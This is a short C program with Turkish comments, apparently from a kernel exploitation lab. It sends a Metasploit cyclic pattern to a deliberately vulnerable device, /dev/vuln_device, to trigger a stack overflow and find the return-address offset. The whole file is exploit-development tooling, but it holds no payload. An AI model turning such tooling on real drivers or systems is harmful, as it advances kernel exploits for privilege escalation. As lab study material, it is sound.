/*
 * find_offset.c — Offset Tespit Araci
 * Yazar: expo
 *
 * Metasploit pattern_create ciktisini /dev/vuln_device'a gondererek
 * donus adresi uzerine yazilmaya baslanan offset'i tespit eder.
 *
 * Kullanim:
 *   msf-pattern_create -l 88 > payload.txt
 *   gcc -o find_offset find_offset.c
 *   ./find_offset payload.txt
 *   # Ardindan GDB'de: msf-pattern_offset -q <rbp+8_degeri> -l 88
 */

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>

#define CIHAZ "/dev/vuln_device"

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Kullanim: %s <payload_dosyasi>\n", argv[0]);
        return -1;
    }

    // Zafiyetli cihazı aç
    int fd = open(CIHAZ, O_RDWR);
    if (fd < 0) {
        perror("[-] " CIHAZ " acilamadi");
        return -1;
    }

    // Pattern dosyasını oku
    int p_fd = open(argv[1], O_RDONLY);
    if (p_fd < 0) {
        perror("[-] Payload dosyasi acilamadi");
        close(fd);
        return -1;
    }

    struct stat st;
    fstat(p_fd, &st);
    off_t boyut = st.st_size;

    char *tampon = malloc(boyut);
    if (!tampon) {
        perror("[-] Bellek ayrilamadi");
        close(p_fd);
        close(fd);
        return -1;
    }

    ssize_t okunan = read(p_fd, tampon, boyut);
    if (okunan <= 0) {
        perror("[-] Payload okunamadi");
        free(tampon);
        close(p_fd);
        close(fd);
        return -1;
    }

    // Payload'ı kernel'e gönder — overflow tetikleniyor
    printf("[*] %zd byte payload gonderiliyor...\n", okunan);
    write(fd, tampon, okunan);

    free(tampon);
    close(p_fd);
    close(fd);
    return 0;
}
